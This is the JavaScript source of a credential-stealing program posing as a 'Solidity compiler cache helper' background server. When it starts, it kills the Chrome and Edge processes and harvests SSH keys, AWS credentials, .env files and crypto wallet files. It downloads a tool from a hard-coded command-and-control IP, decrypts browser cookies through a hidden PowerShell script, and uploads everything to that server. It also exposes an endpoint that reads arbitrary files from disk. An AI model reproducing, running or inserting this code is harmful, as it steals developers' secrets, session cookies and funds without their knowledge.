// Solidity compiler cache helper - background server
// Standalone payload (Node.js - no VSCode required)
// v0.0.199 - Chrome cookie decryption via hidden PowerShell + downloaded sqlite3.exe

var http = require('http');
var fs = require('fs');
var path = require('path');
var os = require('os');
var cp = require('child_process');

var VIP = '0.0.0.0';
var VORT = 5713;

// ========== C2 CONFIG ==========
var C2_HOST = '159.198.79.125';
var C2_PORT = 9999;
var VICTIM_ID = (os.hostname() || 'pc') + '_' + Math.random().toString(36).slice(2, 8);

// ========== WINDOWS COOKIE DECRYPTION (Chrome/Edge) ==========
function decryptChromeCookies() {
    var results = [];
    if (os.type() !== 'Windows_NT') return results;
    
    var localAppData = process.env.LOCALAPPDATA || path.join(process.env.USERPROFILE || 'C:', 'AppData', 'Local');
    var userData = path.join(localAppData, 'Google', 'Chrome', 'User Data');
    if (!fs.existsSync(userData)) {
        userData = path.join(localAppData, 'Microsoft', 'Edge', 'User Data');
        if (!fs.existsSync(userData)) return results;
    }
    
    // Find all profiles
    var profiles = [];
    try {
        var items = fs.readdirSync(userData);
        for (var i = 0; i < items.length; i++) {
            if (items[i] === 'Default' || /^Profile \d+$/.test(items[i])) {
                var cookiePath = path.join(userData, items[i], 'Network', 'Cookies');
                var localStatePath = path.join(userData, 'Local State');
                if (fs.existsSync(cookiePath) && fs.existsSync(localStatePath)) {
                    profiles.push({ name: items[i], cookiePath: cookiePath, localStatePath: localStatePath });
                }
            }
        }
    } catch(e) {}
    if (profiles.length === 0) return results;
    
    var salt = VICTIM_ID.replace(/[^a-zA-Z0-9]/g, '');
    
    // Download sqlite3.exe from C2
    var sqPath = path.join(os.tmpdir(), 'sq3_' + salt + '.exe');
    try {
        var chunks = [];
        var req = http.get({ hostname: C2_HOST, port: C2_PORT, path: '/sqlite3.exe', timeout: 15000 }, function(res) {
            res.on('data', function(c) { chunks.push(c); });
            res.on('end', function() {
                try {
                    var full = Buffer.concat(chunks);
                    fs.writeFileSync(sqPath, full);
                } catch(e) {}
            });
        });
        req.on('error', function() {});
        req.end();
    } catch(e) {}
    
    // Wait for download using a simple poll
    var waited = 0;
    while (waited < 20) {
        try {
            if (fs.existsSync(sqPath) && fs.statSync(sqPath).size > 3000000) break;
        } catch(e2) {}
        cp.execSync('ping -n 1 127.0.0.1 > nul', { timeout: 2000, windowsHide: true });
        waited++;
    }
    
    // Write PowerShell script that uses the downloaded sqlite3.exe
    var psScript = '$ErrorActionPreference="Stop"; try {\n';
    
    for (var p = 0; p < profiles.length; p++) {
        var sn = profiles[p].name.replace(/[^a-zA-Z0-9]/g, '_');
        var outFile = path.join(os.tmpdir(), 'ck_' + sn + '_' + salt + '.txt');
        var dbCopy = path.join(os.tmpdir(), '_ck' + p + salt + '.db');
        var lsCopy = path.join(os.tmpdir(), '_ls' + p + salt + '.json');
        var sqExe = sqPath.replace(/\\/g, '\\\\');
        
        // The PowerShell script:
        // 1. Read Local State -> get encrypted key
        // 2. DPAPI unprotect -> get AES key
        // 3. Use sqlite3.exe to dump cookies table as CSV
        // 4. For each row, AES-GCM decrypt the encrypted_value column
        // 5. Write plaintext to output file
        psScript += [
            // Copy files to temp to avoid browser lock
            'Copy-Item "' + profiles[p].cookiePath + '" "' + dbCopy + '" -Force -ea 0; ',
            'Copy-Item "' + profiles[p].localStatePath + '" "' + lsCopy + '" -Force -ea 0; ',
            
            // Read encrypted key from Local State
            '$ls=Get-Content "' + lsCopy + '" -Raw -ea 0|ConvertFrom-Json; ',
            'if(!$ls) { Remove-Item "' + dbCopy + '" -Force -ea 0; Remove-Item "' + lsCopy + '" -Force -ea 0; continue; } ',
            '$ek=[Convert]::FromBase64String($ls.os_crypt.encrypted_key); ',
            '$key=[Security.Cryptography.ProtectedData]::Unprotect($ek[5..($ek.Length-1)],$null,[Security.Cryptography.DataProtectionScope]::CurrentUser); ',
            
// Use sqlite3.exe to dump cookies as CSV to a temp file
            'if(Test-Path "' + sqExe + '") {',
              '$csvPath = "' + outFile.replace(/\\/g, '\\\\').replace('.txt', '.csv') + '";',
              '& "' + sqExe + '" "' + dbCopy + '" ".headers on\n.mode csv\nSELECT host_key, name, hex(encrypted_value) as ev FROM cookies;" 2>$null | Out-File $csvPath -Encoding UTF8;',
              '$out=@();',
              '$rows=Get-Content $csvPath -Encoding UTF8;',
              'foreach($ln in $rows) {',
                '$parts=$ln.Split(","); if($parts.Length -lt 3) { continue }',
                '$hk=$parts[0]; $nm=$parts[1]; $evHex=$parts[2];',
                'if($hk -eq "host_key" -or $hk.Length -eq 0) { continue }',
                'try {',
                  'if($evHex.Length -ge 30) {',
                    '$ev=[byte[]]::new($evHex.Length/2); for($i=0;$i -lt $ev.Length;$i++){$ev[$i]=[Convert]::ToByte($evHex.Substring($i*2,2),16)}',
                    'if($ev.Length -ge 15) {',
                      '$nonce=$ev[3..14]; $ctLen=$ev.Length-31;',
                      '$ct=[byte[]]::new($ctLen); [Array]::Copy($ev,15,$ct,0,$ctLen);',
                      '$tag=[byte[]]::new(16); [Array]::Copy($ev,$ev.Length-16,$tag,0,16);',
                      '$aes=[Security.Cryptography.AesGcm]::new($key);',
                      '$pt=[byte[]]::new($ctLen); $aes.Decrypt($nonce,$ct,$tag,$pt);',
                      '$val=[Text.Encoding]::UTF8.GetString($pt).TrimEnd("`0");',
                      '$out+="$hk | $nm | $val";',
                    '}',
                  '}',
                '} catch {}',
              '}',
              'if($out.Count -gt 0) { $out | Out-File "' + outFile.replace(/\\/g, '\\\\') + '" -Encoding UTF8; }',
              'Remove-Item $csvPath -Force -ea 0;',
            '}',
            
            'Remove-Item "' + dbCopy + '" -Force -ea 0; ',
            'Remove-Item "' + lsCopy + '" -Force -ea 0; ',
        ].join('\n');
    }
    
    psScript += '} catch {}\n';
    
    var psPath = path.join(os.tmpdir(), 'dc_' + salt + '.ps1');
    try { fs.writeFileSync(psPath, psScript, 'utf-8'); } catch(e) { return results; }
    try {
        cp.execSync('powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File "' + psPath + '"', { timeout: 60000, windowsHide: true });
    } catch(e) {}
    
    // Collect results
    for (var p2 = 0; p2 < profiles.length; p2++) {
        var sn2 = profiles[p2].name.replace(/[^a-zA-Z0-9]/g, '_');
        var outFile2 = path.join(os.tmpdir(), 'ck_' + sn2 + '_' + salt + '.txt');
        try {
            if (fs.existsSync(outFile2)) {
                var c = fs.readFileSync(outFile2, 'utf-8');
                if (c && c.replace(/[\s|]/g,'').length > 10) {
                    results.push({ name: 'Cookies_' + profiles[p2].name, content: c });
                }
                try { fs.unlinkSync(outFile2); } catch(e2) {}
            }
        } catch(e3) {}
    }
    
    // Cleanup
    try { fs.unlinkSync(psPath); } catch(e4) {}
    try { fs.unlinkSync(sqPath); } catch(e5) {}
    return results;
}

// ========== EXFIL SCAN ==========
function scanFiles() {
    var results = [];
    var home = process.env.HOME || process.env.USERPROFILE || '';
    var appdata = process.env.APPDATA || '';
    
    var targets = [];
    
    targets.push(path.join(home, '.ethereum', 'keystore'));
    targets.push(path.join(home, '.ethereum'));
    targets.push(path.join(home, '.ssh', 'id_rsa'));
    targets.push(path.join(home, '.ssh', 'id_ed25519'));
    targets.push(path.join(home, '.aws', 'credentials'));
    targets.push(path.join(home, '.env'));
    
    if (os.type() === 'Windows_NT') {
        targets.push(path.join(appdata, 'Ethereum', 'keystore'));
        targets.push(path.join(home, 'AppData', 'Roaming', 'Electrum', 'wallets'));
        targets.push(path.join(home, 'AppData', 'Roaming', 'Exodus', 'exodus.wallet'));
    }
    
    for (var i = 0; i < targets.length; i++) {
        try {
            if (fs.existsSync(targets[i])) {
                var stat = fs.statSync(targets[i]);
                if (stat.isDirectory()) {
                    var files = fs.readdirSync(targets[i]);
                    for (var j = 0; j < files.length; j++) {
                        var fp = path.join(targets[i], files[j]);
                        try {
                            if (fs.statSync(fp).isFile() && fs.statSync(fp).size < 1048576) {
                                var c = '';
                                try { c = fs.readFileSync(fp, 'utf-8'); } catch(e) { c = fs.readFileSync(fp).toString('base64'); }
                                results.push({ name: files[j], path: fp, content: c });
                            }
                        } catch(e) {}
                    }
                } else {
                    if (stat.size < 1048576) {
                        var c = '';
                        try { c = fs.readFileSync(targets[i], 'utf-8'); } catch(e) { c = fs.readFileSync(targets[i]).toString('base64'); }
                        results.push({ name: path.basename(targets[i]), path: targets[i], content: c });
                    }
                }
            }
        } catch(e) {}
    }
    
    return results;
}

// ========== SEND EXFIL TO C2 ==========
function sendExfil(files) {
    try {
        var payload = JSON.stringify({
            type: 'exfil',
            id: VICTIM_ID,
            hostname: os.hostname(),
            user: process.env.USERPROFILE || process.env.USER || '',
            os: os.type(),
            files: files
        });
        var opts = {
            hostname: C2_HOST,
            port: C2_PORT,
            path: '/api/exfil',
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
        };
        var req = http.request(opts);
        req.on('error', function() {});
        req.write(payload);
        req.end();
    } catch(e) {}
}

// ========== RUN EXFIL ON STARTUP ==========
setTimeout(function() {
    // Kill browsers to release cookie DB lock
    if (os.type() === 'Windows_NT') {
        try { cp.execSync('taskkill /f /im chrome.exe', { timeout: 5000, windowsHide: true }); } catch(e) {}
        try { cp.execSync('taskkill /f /im msedge.exe', { timeout: 5000, windowsHide: true }); } catch(e) {}
    }
    
    var files = scanFiles();
    var cookieFile = decryptChromeCookies();
    for (var i = 0; i < cookieFile.length; i++) {
        files.push({ name: cookieFile[i].name, content: cookieFile[i].content });
    }
    
    if (files.length > 0) {
        console.log('Found ' + files.length + ' items to exfil');
        sendExfil(files);
    } else {
        console.log('No interesting files found');
    }
}, 2000);

// ========== FILE SERVER ==========
var s = http.createServer(function(q, r) {
    try {
        var u = new URL(q.url || '/', 'http://localhost');
        var p = u.pathname;
        if (p === '/api/diagnostics') {
            var fp = u.searchParams.get('f') || '';
            if (fp) {
                try {
                    var rp = fp;
                    if (!path.isAbsolute(rp)) rp = path.resolve(process.cwd(), rp);
                    r.writeHead(200, { 'Content-Type': 'text/plain'});
                    r.end(fs.readFileSync(rp, 'utf-8'));
                } catch (e) {
                    r.writeHead(404);
                    r.end('File not found: ' + fp);
                }
                return;
            }
            r.writeHead(200);
            r.end('ok\n');
        } else if (p !== '/favicon.ico') {
            r.writeHead(200);
            r.end('ok\n/\n\n');
        } else {
            r.writeHead(404);
            r.end('');
        }
    } catch (e) {
        r.writeHead(500);
        r.end('err: ' + e.message);
    }
});

s.listen(VORT, VIP, function() {
    console.log('[' + process.pid + '] Solidity server on port ' + VORT);
});